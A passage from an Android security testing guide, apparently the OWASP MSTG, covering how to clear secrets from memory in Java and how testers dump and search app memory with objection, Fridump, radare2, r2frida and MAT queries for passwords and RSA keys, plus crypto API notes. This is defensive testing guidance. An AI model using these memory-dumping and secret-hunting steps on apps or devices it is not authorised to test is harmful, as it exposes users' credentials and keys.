    \texttt{finalize} method.
  \item
    Pay attention to third-party components (libraries and frameworks).
    Public APIs are good indicators. Determine whether the public API
    handles the sensitive data as described in this chapter.
  \end{itemize}
\end{itemize}

\textbf{The following section describes pitfalls of data leakage in
memory and best practices for avoiding them.}

Don't use immutable structures (e.g., \texttt{String} and
\texttt{BigInteger}) to represent secrets. Nullifying these structures
will be ineffective: the garbage collector may collect them, but they
may remain on the heap after garbage collection. Nevertheless, you
should ask for garbage collection after every critical operation (e.g.,
encryption, parsing server responses that contain sensitive
information). When copies of the information have not been properly
cleaned (as explained below), your request will help reduce the length
of time for which these copies are available in memory.

To properly clean sensitive information from memory, store it in
primitive data types, such as byte-arrays (\texttt{byte{[}{]}}) and
char-arrays (\texttt{char{[}{]}}). As described in the ``Static
Analysis'' section above, you should avoid storing the information in
mutable non-primitive data types.

Make sure to overwrite the content of the critical object once the
object is no longer needed. Overwriting the content with zeroes is one
simple and very popular method:

\begin{Shaded}
\begin{Highlighting}[]
\DataTypeTok{byte}\NormalTok{[] secret = }\KeywordTok{null}\NormalTok{;}
\KeywordTok{try}\NormalTok{\{}
    \CommentTok{//get or generate the secret, do work with it, make sure you make no local copies}
\NormalTok{\} }\KeywordTok{finally}\NormalTok{ \{}
    \KeywordTok{if}\NormalTok{ (}\KeywordTok{null}\NormalTok{ != secret) \{}
        \BuiltInTok{Arrays}\NormalTok{.}\FunctionTok{fill}\NormalTok{(secret, (}\DataTypeTok{byte}\NormalTok{) }\DecValTok{0}\NormalTok{);}
\NormalTok{    \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

This doesn't, however, guarantee that the content will be overwritten at
runtime. To optimize the bytecode, the compiler will analyze and decide
not to overwrite data because it will not be used afterwards (i.e., it
is an unnecessary operation). Even if the code is in the compiled DEX,
the optimization may occur during the just-in-time or ahead-of-time
compilation in the VM.

There is no silver bullet for this problem because different solutions
have different consequences. For example, you may perform additional
calculations (e.g., XOR the data into a dummy buffer), but you'll have
no way to know the extent of the compiler's optimization analysis. On
the other hand, using the overwritten data outside the compiler's scope
(e.g., serializing it in a temp file) guarantees that it will be
overwritten but obviously impacts performance and maintenance.

Then, using \texttt{Arrays.fill} to overwrite the data is a bad idea
because the method is an obvious hooking target (see the chapter
``\href{0x05c-Reverse-Engineering-and-Tampering.md}{Tampering and
Reverse Engineering on Android}'' for more details).

The final issue with the above example is that the content was
overwritten with zeroes only. You should try to overwrite critical
objects with random data or content from non-critical objects. This will
make it really difficult to construct scanners that can identify
sensitive data on the basis of its management.

Below is an improved version of the previous example:

\begin{Shaded}
\begin{Highlighting}[]
\DataTypeTok{byte}\NormalTok{[] nonSecret = somePublicString.}\FunctionTok{getBytes}\NormalTok{(}\StringTok{"ISO{-}8859{-}1"}\NormalTok{);}
\DataTypeTok{byte}\NormalTok{[] secret = }\KeywordTok{null}\NormalTok{;}
\KeywordTok{try}\NormalTok{\{}
    \CommentTok{//get or generate the secret, do work with it, make sure you make no local copies}
\NormalTok{\} }\KeywordTok{finally}\NormalTok{ \{}
    \KeywordTok{if}\NormalTok{ (}\KeywordTok{null}\NormalTok{ != secret) \{}
        \KeywordTok{for}\NormalTok{ (}\DataTypeTok{int}\NormalTok{ i = }\DecValTok{0}\NormalTok{; i < secret.}\FunctionTok{length}\NormalTok{; i++) \{}
\NormalTok{            secret[i] = nonSecret[i \% nonSecret.}\FunctionTok{length}\NormalTok{];}
\NormalTok{        \}}

        \BuiltInTok{FileOutputStream}\NormalTok{ out = }\KeywordTok{new} \BuiltInTok{FileOutputStream}\NormalTok{(}\StringTok{"/dev/null"}\NormalTok{);}
\NormalTok{        out.}\FunctionTok{write}\NormalTok{(secret);}
\NormalTok{        out.}\FunctionTok{flush}\NormalTok{();}
\NormalTok{        out.}\FunctionTok{close}\NormalTok{();}
\NormalTok{    \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

For more information, take a look at
\href{https://www.nowsecure.com/resources/secure-mobile-development/coding-practices/securely-store-sensitive-data-in-ram/}{Securely
Storing Sensitive Data in RAM}.

In the ``Static Analysis'' section, we mentioned the proper way to
handle cryptographic keys when you are using \texttt{AndroidKeyStore} or
\texttt{SecretKey}.

For a better implementation of \texttt{SecretKey}, look at the
\texttt{SecureSecretKey} class below. Although the implementation is
probably missing some boilerplate code that would make the class
compatible with \texttt{SecretKey}, it addresses the main security
concerns:

\begin{itemize}
\item
  No cross-context handling of sensitive data. Each copy of the key can
  be cleared from within the scope in which it was created.
\item
  The local copy is cleared according to the recommendations given
  above.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \KeywordTok{class}\NormalTok{ SecureSecretKey }\KeywordTok{implements}\NormalTok{ javax.}\FunctionTok{crypto}\NormalTok{.}\FunctionTok{SecretKey}\NormalTok{, }\BuiltInTok{Destroyable}\NormalTok{ \{}
    \KeywordTok{private} \DataTypeTok{byte}\NormalTok{[] key;}
    \KeywordTok{private} \DataTypeTok{final} \BuiltInTok{String}\NormalTok{ algorithm;}

    \CommentTok{/**}\NormalTok{ Constructs SecureSecretKey instance out of a copy of the provided key bytes}\CommentTok{.}
      \CommentTok{*}\NormalTok{ The caller is responsible of clearing the key array provided as input}\CommentTok{.}
      \CommentTok{*}\NormalTok{ The internal copy of the key can be cleared by calling the destroy}\CommentTok{()}\NormalTok{ method}\CommentTok{.}
      \CommentTok{*/}
    \KeywordTok{public} \FunctionTok{SecureSecretKey}\NormalTok{(}\DataTypeTok{final} \DataTypeTok{byte}\NormalTok{[] key, }\DataTypeTok{final} \BuiltInTok{String}\NormalTok{ algorithm) \{}
        \KeywordTok{this}\NormalTok{.}\FunctionTok{key}\NormalTok{ = key.}\FunctionTok{clone}\NormalTok{();}
        \KeywordTok{this}\NormalTok{.}\FunctionTok{algorithm}\NormalTok{ = algorithm;}
\NormalTok{    \}}

    \KeywordTok{public} \BuiltInTok{String} \FunctionTok{getAlgorithm}\NormalTok{() \{}
        \KeywordTok{return} \KeywordTok{this}\NormalTok{.}\FunctionTok{algorithm}\NormalTok{;}
\NormalTok{    \}}

    \KeywordTok{public} \BuiltInTok{String} \FunctionTok{getFormat}\NormalTok{() \{}
        \KeywordTok{return} \StringTok{"RAW"}\NormalTok{;}
\NormalTok{    \}}

    \CommentTok{/**}\NormalTok{ Returns a copy of the key}\CommentTok{.}
      \CommentTok{*}\NormalTok{ Make sure to clear the returned byte array when no longer needed}\CommentTok{.}
      \CommentTok{*/}
    \KeywordTok{public} \DataTypeTok{byte}\NormalTok{[] }\FunctionTok{getEncoded}\NormalTok{() \{}
        \KeywordTok{if}\NormalTok{(}\KeywordTok{null}\NormalTok{ == key)\{}
            \KeywordTok{throw} \KeywordTok{new} \BuiltInTok{NullPointerException}\NormalTok{();}
\NormalTok{        \}}

        \KeywordTok{return}\NormalTok{ key.}\FunctionTok{clone}\NormalTok{();}
\NormalTok{    \}}

    \CommentTok{/**}\NormalTok{ Overwrites the key with dummy data to ensure this copy is no longer present in memory}\CommentTok{.*/}
    \KeywordTok{public} \DataTypeTok{void} \FunctionTok{destroy}\NormalTok{() \{}
        \KeywordTok{if}\NormalTok{ (}\FunctionTok{isDestroyed}\NormalTok{()) \{}
            \KeywordTok{return}\NormalTok{;}
\NormalTok{        \}}

        \DataTypeTok{byte}\NormalTok{[] nonSecret = }\KeywordTok{new} \BuiltInTok{String}\NormalTok{(}\StringTok{"RuntimeException"}\NormalTok{).}\FunctionTok{getBytes}\NormalTok{(}\StringTok{"ISO{-}8859{-}1"}\NormalTok{);}
        \KeywordTok{for}\NormalTok{ (}\DataTypeTok{int}\NormalTok{ i = }\DecValTok{0}\NormalTok{; i < key.}\FunctionTok{length}\NormalTok{; i++) \{}
\NormalTok{          key[i] = nonSecret[i \% nonSecret.}\FunctionTok{length}\NormalTok{];}
\NormalTok{        \}}

        \BuiltInTok{FileOutputStream}\NormalTok{ out = }\KeywordTok{new} \BuiltInTok{FileOutputStream}\NormalTok{(}\StringTok{"/dev/null"}\NormalTok{);}
\NormalTok{        out.}\FunctionTok{write}\NormalTok{(key);}
\NormalTok{        out.}\FunctionTok{flush}\NormalTok{();}
\NormalTok{        out.}\FunctionTok{close}\NormalTok{();}

        \KeywordTok{this}\NormalTok{.}\FunctionTok{key}\NormalTok{ = }\KeywordTok{null}\NormalTok{;}
        \BuiltInTok{System}\NormalTok{.}\FunctionTok{gc}\NormalTok{();}
\NormalTok{    \}}

    \KeywordTok{public} \DataTypeTok{boolean} \FunctionTok{isDestroyed}\NormalTok{() \{}
        \KeywordTok{return}\NormalTok{ key == }\KeywordTok{null}\NormalTok{;}
\NormalTok{    \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}
\end{itemize}

Secure user-provided data is the final secure information type usually
found in memory. This is often managed by implementing a custom input
method, for which you should follow the recommendations given here.
However, Android allows information to be partially erased from
\texttt{EditText} buffers via a custom \texttt{Editable.Factory}.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{EditText editText = ...; }\CommentTok{//  point your variable to your EditText instance}
\NormalTok{EditText.}\FunctionTok{setEditableFactory}\NormalTok{(}\KeywordTok{new}\NormalTok{ Editable.}\FunctionTok{Factory}\NormalTok{() \{}
  \KeywordTok{public}\NormalTok{ Editable }\FunctionTok{newEditable}\NormalTok{(}\BuiltInTok{CharSequence}\NormalTok{ source) \{}
  \KeywordTok{... }\CommentTok{// return a new instance of a secure implementation of Editable.}
\NormalTok{  \}}
\NormalTok{\});}
\end{Highlighting}
\end{Shaded}

Refer to the \texttt{SecureSecretKey} example above for an example
\texttt{Editable} implementation. Note that you will be able to securely
handle all copies made by \texttt{editText.getText} if you provide your
factory. You can also try to overwrite the internal \texttt{EditText}
buffer by calling \texttt{editText.setText}, but there is no guarantee
that the buffer will not have been copied already. If you choose to rely
on the default input method and \texttt{EditText}, you will have no
control over the keyboard or other components that are used. Therefore,
you should use this approach for semi-confidential information only.

In all cases, make sure that sensitive data in memory is cleared when a
user signs out of the application. Finally, make sure that highly
sensitive information is cleared out the moment an Activity or
Fragment's \texttt{onPause} event is triggered.

\begin{quote}
Note that this might mean that a user has to re-authenticate every time
the application resumes.
\end{quote}

\hypertarget{dynamic-analysis-17}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-17}}

Static analysis will help you identify potential problems, but it can't
provide statistics about how long data has been exposed in memory, nor
can it help you identify problems in closed-source dependencies. This is
where dynamic analysis comes into play.

There are various ways to analyze the memory of a process, e.g.~live
analysis via a debugger/dynamic instrumentation and analyzing one or
more memory dumps.

\hypertarget{retrieving-and-analyzing-a-memory-dump}{%
\subparagraph{Retrieving and Analyzing a Memory
Dump}\label{retrieving-and-analyzing-a-memory-dump}}

Wether you are using a rooted or a non-rooted device, you can dump the
app's process memory with
\href{https://github.com/sensepost/objection}{objection} and
\href{https://github.com/Nightbringer21/fridump}{Fridump}. You can find
a detailed explanation of this process in the section
``\href{0x05c-Reverse-Engineering-and-Tampering.md\#memory-dump}{Memory
Dump}'', in the chapter ``Tampering and Reverse Engineering on
Android''.

After the memory has been dumped (e.g.~to a file called ``memory''),
depending on the nature of the data you're looking for, you'll need a
set of different tools to process and analyze that memory dump. For
instance, if you're focusing on strings, it might be sufficient for you
to execute the command \texttt{strings} or \texttt{rabin2\ -zz} to
extract those strings.

\begin{verbatim}
# using strings
$ strings memory > strings.txt

# using rabin2
$ rabin2 -ZZ memory > strings.txt
\end{verbatim}

Open \texttt{strings.txt} in your favorite editor and dig through it to
identify sensitive information.

However if you'd like to inspect other kind of data, you'd rather want
to use radare2 and its search capabilities. See radare2's help on the
search command (\texttt{/?}) for more information and a list of options.
The following shows only a subset of them:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{r2} \OperatorTok{<}\NormalTok{name\_of\_your\_dump\_file}\OperatorTok{>}

\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ /?}
\ExtensionTok{Usage}\NormalTok{: /[!bf] [arg]  Search stuff (see }\StringTok{\textquotesingle{}e??search\textquotesingle{}}\NormalTok{ for options)}
\KeywordTok{|}\ExtensionTok{Use}\NormalTok{ io.va for searching in non virtual addressing spaces}
\KeywordTok{|} \ExtensionTok{/}\NormalTok{ foo\textbackslash{}x00                    search for string }\StringTok{\textquotesingle{}foo\textbackslash{}0\textquotesingle{}}
\KeywordTok{|}\NormalTok{ /}\ExtensionTok{c}\NormalTok{[ar]                       search for crypto materials}
\KeywordTok{|} \ExtensionTok{/e}\NormalTok{ /E.F/i                    match regular expression}
\KeywordTok{|} \ExtensionTok{/i}\NormalTok{ foo                       search for string }\StringTok{\textquotesingle{}foo\textquotesingle{}}\NormalTok{ ignoring case}
\KeywordTok{|}\NormalTok{ /}\ExtensionTok{m}\NormalTok{[?][ebm] magicfile         search for magic, filesystems or binary headers}
\KeywordTok{|}\NormalTok{ /}\ExtensionTok{v}\NormalTok{[1248] value               look for an }\KeywordTok{\textasciigrave{}}\ExtensionTok{cfg.bigendian}\KeywordTok{\textasciigrave{}}\NormalTok{ 32bit value}
\KeywordTok{|} \ExtensionTok{/w}\NormalTok{ foo                       search for wide string }\StringTok{\textquotesingle{}f\textbackslash{}0o\textbackslash{}0o\textbackslash{}0\textquotesingle{}}
\KeywordTok{|} \ExtensionTok{/x}\NormalTok{ ff0033                    search for hex string}
\KeywordTok{|} \ExtensionTok{/z}\NormalTok{ min max                   search for strings of given size}
\ExtensionTok{...}
\end{Highlighting}
\end{Shaded}

\hypertarget{runtime-memory-analysis}{%
\subparagraph{Runtime Memory Analysis}\label{runtime-memory-analysis}}

Instead of dumping the memory to your host computer, you can
alternatively use r2frida. With it, you can analyze and inspect the
app's memory while it's running. For example, you may run the previous
search commands from r2frida and search the memory for a string,
hexadecimal values, etc. When doing so, remember to prepend the search
command (and any other r2frida specific commands) with a backslash
\texttt{\textbackslash{}} after starting the session with
\texttt{r2\ frida://usb//\textless{}name\_of\_your\_app\textgreater{}}.

For more information, options and approaches, please refer to section
``\href{0x05c-Reverse-Engineering-and-Tampering.md\#in-memory-search}{In-Memory
Search}'' in the chapter ``Tampering and Reverse Engineering on
Android''.

\hypertarget{explicitly-dumping-and-analyzing-the-java-heap}{%
\subparagraph{Explicitly Dumping and Analyzing the Java
Heap}\label{explicitly-dumping-and-analyzing-the-java-heap}}

For rudimentary analysis, you can use Android Studio's built-in tools.
They are on the \emph{Android Monitor} tab. To dump memory, select the
device and app you want to analyze and click \emph{Dump Java Heap}. This
will create a \emph{.hprof} file in the \emph{captures} directory, which
is on the app's project path.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/e9acff65016bb9e041e6fed3ec844f8e4df0cae9.png}
\caption{Images/Chapters/0x05d/Dump\_Java\_Heap.png}
\end{figure}

To navigate through class instances that were saved in the memory dump,
select the Package Tree View in the tab showing the \emph{.hprof} file.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/5714378441f6a767b5bf09078d621a244d4d9fc2.png}
\caption{Images/Chapters/0x05d/Package\_Tree\_View.png}
\end{figure}

For more advanced analysis of the memory dump, use the Eclipse Memory
Analyzer Tool (MAT). It is available as an Eclipse plugin and as a
standalone application.

To analyze the dump in MAT, use the \emph{hprof-conv} platform tool,
which comes with the Android SDK.

\begin{verbatim}
$ ./hprof-conv memory.hprof memory-mat.hprof
\end{verbatim}

MAT provides several tools for analyzing the memory dump. For example,
the \emph{Histogram} provides an estimate of the number of objects that
have been captured from a given type, and the \emph{Thread Overview}
shows processes' threads and stack frames. The \emph{Dominator Tree}
provides information about keep-alive dependencies between objects. You
can use regular expressions to filter the results these tools provide.

\emph{Object Query Language} studio is a MAT feature that allows you to
query objects from the memory dump with an SQL-like language. The tool
allows you to transform simple objects by invoking Java methods on them,
and it provides an API for building sophisticated tools on top of the
MAT.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{SELECT} \OperatorTok{*} \KeywordTok{FROM} \KeywordTok{java}\NormalTok{.lang.String}
\end{Highlighting}
\end{Shaded}

In the example above, all \texttt{String} objects present in the memory
dump will be selected. The results will include the object's class,
memory address, value, and retain count. To filter this information and
see only the value of each string, use the following code:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{SELECT}\NormalTok{ toString(}\DataTypeTok{object}\NormalTok{) }\KeywordTok{FROM} \KeywordTok{java}\NormalTok{.lang.String }\DataTypeTok{object}
\end{Highlighting}
\end{Shaded}

Or

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{SELECT} \DataTypeTok{object}\NormalTok{.toString() }\KeywordTok{FROM} \KeywordTok{java}\NormalTok{.lang.String }\DataTypeTok{object}
\end{Highlighting}
\end{Shaded}

SQL supports primitive data types as well, so you can do something like
the following to access the content of all \texttt{char} arrays:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{SELECT}\NormalTok{ toString(arr) }\KeywordTok{FROM} \DataTypeTok{char}\NormalTok{[] arr}
\end{Highlighting}
\end{Shaded}

Don't be surprised if you get results that are similar to the previous
results; after all, \texttt{String} and other Java data types are just
wrappers around primitive data types. Now let's filter the results. The
following sample code will select all byte arrays that contain the ASN.1
OID of an RSA key. This doesn't imply that a given byte array actually
contains an RSA (the same byte sequence may be part of something else),
but this is probable.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{SELECT} \OperatorTok{*} \KeywordTok{FROM}\NormalTok{ byte[] b }\KeywordTok{WHERE}\NormalTok{ toString(b).matches(}\OtherTok{".*1\textbackslash{}.2\textbackslash{}.840\textbackslash{}.113549\textbackslash{}.1\textbackslash{}.1\textbackslash{}.1.*"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

Finally, you don't have to select whole objects. Consider an SQL
analogy: classes are tables, objects are rows, and fields are columns.
If you want to find all objects that have a ``password'' field, you can
do something like the following:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{SELECT} \KeywordTok{password} \KeywordTok{FROM} \OtherTok{".*"} \KeywordTok{WHERE}\NormalTok{ (}\KeywordTok{null} \OperatorTok{!=} \KeywordTok{password}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

During your analysis, search for:

\begin{itemize}
\tightlist
\item
  Indicative field names: ``password'', ``pass'', ``pin'', ``secret'',
  ``private'', etc.
\item
  Indicative patterns (e.g., RSA footprints) in strings, char arrays,
  byte arrays, etc.
\item
  Known secrets (e.g., a credit card number that you've entered or an
  authentication token provided by the backend)
\item
  etc.
\end{itemize}

Repeating tests and memory dumps will help you obtain statistics about
the length of data exposure. Furthermore, observing the way a particular
memory segment (e.g., a byte array) changes may lead you to some
otherwise unrecognizable sensitive data (more on this in the
``Remediation'' section below).

\hypertarget{testing-the-device-access-security-policy-mstg-storage-11}{%
\subsubsection{Testing the Device-Access-Security Policy
(MSTG-STORAGE-11)}\label{testing-the-device-access-security-policy-mstg-storage-11}}

\hypertarget{overview-13}{%
\paragraph{Overview}\label{overview-13}}

Apps that process or query sensitive information should run in a trusted
and secure environment. To create this environment, the app can check
the device for the following:

\begin{itemize}
\tightlist
\item
  PIN- or password-protected device locking
\item
  Recent Android OS version
\item
  USB Debugging activation
\item
  Device encryption
\item
  Device rooting (see also ``Testing Root Detection'')
\end{itemize}

\hypertarget{static-analysis-21}{%
\paragraph{Static Analysis}\label{static-analysis-21}}

To test the device-access-security policy that the app enforces, a
written copy of the policy must be provided. The policy should define
available checks and their enforcement. For example, one check could
require that the app run only on Android 6.0 (API level 23) or a more
recent version, closing the app or displaying a warning if the Android
version is less than 6.0.

Check the source code for functions that implement the policy and
determine whether it can be bypassed.

You can implement checks on the Android device by querying
\href{https://developer.android.com/reference/android/provider/Settings.Secure.html}{\emph{Settings.Secure}}
for system preferences.
\href{https://developer.android.com/guide/topics/admin/device-admin.html}{\emph{Device
Administration API}} offers techniques for creating applications that
can enforce password policies and device encryption.

\hypertarget{dynamic-analysis-18}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-18}}

The dynamic analysis depends on the checks enforced by the app and their
expected behavior. If the checks can be bypassed, they must be
validated.

\hypertarget{references-9}{%
\subsubsection{References}\label{references-9}}

\hypertarget{owasp-masvs-6}{%
\paragraph{OWASP MASVS}\label{owasp-masvs-6}}

\begin{itemize}
\tightlist
\item
  MSTG-STORAGE-1: ``System credential storage facilities need to be used
  to store sensitive data, such as PII, user credentials or
  cryptographic keys.''
\item
  MSTG-STORAGE-2: ``No sensitive data should be stored outside of the
  app container or system credential storage facilities.''
\item
  MSTG-STORAGE-3: ``No sensitive data is written to application logs.''
\item
  MSTG-STORAGE-4: ``No sensitive data is shared with third parties
  unless it is a necessary part of the architecture.''
\item
  MSTG-STORAGE-5: ``The keyboard cache is disabled on text inputs that
  process sensitive data.''
\item
  MSTG-STORAGE-6: ``No sensitive data is exposed via IPC mechanisms.''
\item
  MSTG-STORAGE-7: ``No sensitive data, such as passwords or pins, is
  exposed through the user interface.''
\item
  MSTG-STORAGE-8: ``No sensitive data is included in backups generated
  by the mobile operating system.''
\item
  MSTG-STORAGE-9: ``The app removes sensitive data from views when moved
  to the background.''
\item
  MSTG-STORAGE-10: ``The app does not hold sensitive data in memory
  longer than necessary, and memory is cleared explicitly after use.''
\item
  MSTG-STORAGE-11: ``The app enforces a minimum device-access-security
  policy, such as requiring the user to set a device passcode.''
\item
  MSTG-PLATFORM-2: ``All inputs from external sources and the user are
  validated and if necessary sanitized. This includes data received via
  the UI, IPC mechanisms such as intents, custom URLs, and network
  sources.''
\end{itemize}

\hypertarget{tools-5}{%
\paragraph{Tools}\label{tools-5}}

\begin{itemize}
\tightlist
\item
  Android Backup Extractor -
  \url{https://github.com/nelenkov/android-backup-extractor}
\item
  Burp Suite Professional - \url{https://portswigger.net/burp/}
\item
  Drozer - \url{https://labs.mwrinfosecurity.com/tools/drozer/}
\item
  Eclipse Memory Analyzer (MAT) -
  \url{https://eclipse.org/mat/downloads.php}
\item
  Firebase Scanner - \url{https://github.com/shivsahni/FireBaseScanner}
\item
  Fridump - \url{https://github.com/Nightbringer21/fridump}
\item
  LiME - \url{https://github.com/504ensicsLabs/LiME}
\item
  Logcat - \url{http://developer.android.com/tools/help/logcat.html}
\item
  Memory Monitor -
  \url{http://developer.android.com/tools/debugging/debugging-memory.html\#ViewHeap}
\item
  OWASP ZAP -
  \url{https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project}
\item
  ProGuard - \url{http://proguard.sourceforge.net/}
\item
  Realm Browser - Realm Browser -
  \url{https://github.com/realm/realm-browser-osx}
\item
  Sqlite3 - \url{http://www.sqlite.org/cli.html}
\end{itemize}

\hypertarget{libraries}{%
\paragraph{Libraries}\label{libraries}}

\begin{itemize}
\tightlist
\item
  Java AES Crypto - \url{https://github.com/tozny/java-aes-crypto}
\item
  SQL Cipher -
  \url{https://www.zetetic.net/sqlcipher/sqlcipher-for-android}
\item
  Secure Preferences -
  \url{https://github.com/scottyab/secure-preferences}
\end{itemize}

\hypertarget{android-cryptographic-apis}{%
\subsection{Android Cryptographic
APIs}\label{android-cryptographic-apis}}

\hypertarget{overview-14}{%
\subsubsection{Overview}\label{overview-14}}

In the chapter ``\href{0x04g-Testing-Cryptography.md}{Cryptography for
Mobile Apps}'', we introduced general cryptography best practices and
described typical flaws that can occur when cryptography is used
incorrectly in mobile apps. In this chapter, we'll go into more detail
on Android's cryptography APIs. We'll show how to identify uses of those
APIs in the source code and how to interpret the configuration. When
reviewing code, make sure to compare the cryptographic parameters used
with the current best practices linked from this guide.

We can identify key components of cryptography system in Android:

\begin{itemize}
\tightlist
\item
  \href{0x05e-Testing-Cryptography.md\#security-provider}{Security
  Provider}
\item
  KeyStore - see the section
  \href{0x05d-Testing-Data-Storage.md\#keystore}{KeyStore} in the
  chapter ``Testing Data Storage''
\item
  KeyChain - see the section
  \href{0x05d-Testing-Data-Storage.md\#keychain}{KeyChain} in the
  chapter ``Testing Data Storage''
\end{itemize}

Android cryptography APIs are based on the Java Cryptography
Architecture (JCA). JCA separates the interfaces and implementation,
making it possible to include several
\href{https://developer.android.com/reference/java/security/Provider.html}{security
providers} that can implement sets of cryptographic algorithms. Most of
the JCA interfaces and classes are defined in the
\texttt{java.security.*} and \texttt{javax.crypto.*} packages. In
addition, there are Android specific packages
\texttt{android.security.*} and \texttt{android.security.keystore.*}.

KeyStore and KeyChain provide APIs for storing and using keys (behind
the scene, KeyChain API uses KeyStore system). These systems allow to
administer the full lifecycle of the cryptographic keys. Requirements
and guidance for implementation of cryptographic key management can be
found in
\href{https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html}{Key
Management Cheat Sheet}. We can identify following phases:

\begin{itemize}
\tightlist
\item
  generating a key
\item
  using a key
\item
  storing a key
\item
  archiving a key
\item
  deleting a key
\end{itemize}

\begin{quote}
Please note that storing of a key is analyzed in the chapter
``\href{0x05d-Testing-Data-Storage.md}{Testing Data Storage}''.
\end{quote}

These phases are managed by the Keystore/KeyChain system. However how
the system works depends on how the application developer implemented
it. For the analysis process you should focus on functions which are
used by the application developer. You should identify and verify the
following functions:

\begin{itemize}
\tightlist
\item
  \href{0x05e-Testing-Cryptography.md\#key-generation}{Key generation}
\item
  \href{0x05e-Testing-Cryptography.md\#random-number-generation}{Random
  number generation}
\item
  Key rotation
\end{itemize}

Apps that target modern API levels, went through the following changes:

\begin{itemize}
\tightlist
\item
  For Android 7.0 (API level 24) and above
  \href{https://android-developers.googleblog.com/2016/06/security-crypto-provider-deprecated-in.html}{the
  Android Developer blog shows that}:

  \begin{itemize}
  \tightlist
  \item
    It is recommended to stop specifying a security provider. Instead,
    always use a
    \href{0x05e-Testing-Cryptography.md\#updating-provider}{patched
    security provider}.
  \item
    The support for the \texttt{Crypto} provider has dropped and the
    provider is deprecated. The same applies to its \texttt{SHA1PRNG}
    for secure random.
  \end{itemize}
\item
  For Android 8.1 (API level 27) and above the
  \href{https://developer.android.com/about/versions/oreo/android-8.1}{Developer
  Documentation} shows that:

  \begin{itemize}
  \tightlist
  \item
    Conscrypt, known as \texttt{AndroidOpenSSL}, is preferred above
    using Bouncy Castle and it has new implementations:
    \texttt{AlgorithmParameters:GCM} , \texttt{KeyGenerator:AES},
    \texttt{KeyGenerator:DESEDE}, \texttt{KeyGenerator:HMACMD5},
    \texttt{KeyGenerator:HMACSHA1}, \texttt{KeyGenerator:HMACSHA224},
    \texttt{KeyGenerator:HMACSHA256}, \texttt{KeyGenerator:HMACSHA384},
    \texttt{KeyGenerator:HMACSHA512}, \texttt{SecretKeyFactory:DESEDE},
    and \texttt{Signature:NONEWITHECDSA}.
  \item
    You should not use the \texttt{IvParameterSpec.class} anymore for
    GCM, but use the \texttt{GCMParameterSpec.class} instead.
  \item
    Sockets have changed from \texttt{OpenSSLSocketImpl} to
    \texttt{ConscryptFileDescriptorSocket}, and
    \texttt{ConscryptEngineSocket}.
  \item
    \texttt{SSLSession} with null parameters give a
    \texttt{NullPointerException}.
  \item
    You need to have large enough arrays as input bytes for generating a
    key otherwise, an \texttt{InvalidKeySpecException} is thrown.
  \item
    If a Socket read is interrupted, you get a \texttt{SocketException}.
  \end{itemize}
\item
  For Android 9 (API level 28) and above the
  \href{https://android-developers.googleblog.com/2018/03/cryptography-changes-in-android-p.html}{Android
  Developer Blog} shows even more changes:

  \begin{itemize}
  \tightlist
  \item
    You get a warning if you still specify a security provider using the
    \texttt{getInstance} method and you target any API below 28. If you
    target Android 9 (API level 28) or above, you get an error.
  \item
    The \texttt{Crypto} security provider is now removed. Calling it
    will result in a \texttt{NoSuchProviderException}.
  \end{itemize}
\item
  For Android 10 (API level 29) the
  \href{https://developer.android.com/about/versions/10/behavior-changes-all\#security}{Developer
  Documentation} lists all network security changes.
\end{itemize}

\hypertarget{recommendation}{%
\paragraph{Recommendation}\label{recommendation}}

The following list of recommendations should be considered during app
examination:

\begin{itemize}
\tightlist
\item
  You should ensure that the best practices outlined in the
  ``\href{0x04g-Testing-Cryptography.md}{Cryptography for Mobile Apps}''
  chapter are followed.
\item
  You should ensure that security provider has the latest updates -
  \href{https://developer.android.com/training/articles/security-gms-provider}{Updating
  security provider}.
\item
  You should stop specifying a security provider and use the default
  implementation (AndroidOpenSSL, Conscrypt).
\item
  You should stop using Crypto security provider and its
  \texttt{SHA1PRNG} as they are depracated.
\item
  You should specify a security provider only for the Android Keystore
  system.
\item
  You should stop using Password-based encryption ciphers without IV.
\item
  You should use KeyGenParameterSpec instead of KeyPairGeneratorSpec.
\end{itemize}

\hypertarget{security-provider}{%
\paragraph{Security provider}\label{security-provider}}

Android relies on \texttt{provider} to implement Java Security services.
That is crucial to ensure secure network communications and secure other
functionalities which depend on cryptography.

The list of security providers included in Android varies between
versions of Android and the OEM-specific builds. Some security provider
implementations in older versions are now known to be less secure or
vulnerable. Thus, Android applications should not only choose the
correct algorithms and provide good configuration, in some cases they
should also pay attention to the strength of the implementations in the
legacy security providers.

You can list the set of existing security providers using following
code:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{StringBuilder}\NormalTok{ builder = }\KeywordTok{new} \BuiltInTok{StringBuilder}\NormalTok{();}
\KeywordTok{for}\NormalTok{ (}\BuiltInTok{Provider}\NormalTok{ provider : }\BuiltInTok{Security}\NormalTok{.}\FunctionTok{getProviders}\NormalTok{()) \{}
\NormalTok{    builder.}\FunctionTok{append}\NormalTok{(}\StringTok{"provider: "}\NormalTok{)}
\NormalTok{            .}\FunctionTok{append}\NormalTok{(provider.}\FunctionTok{getName}\NormalTok{())}
\NormalTok{            .}\FunctionTok{append}\NormalTok{(}\StringTok{" "}\NormalTok{)}
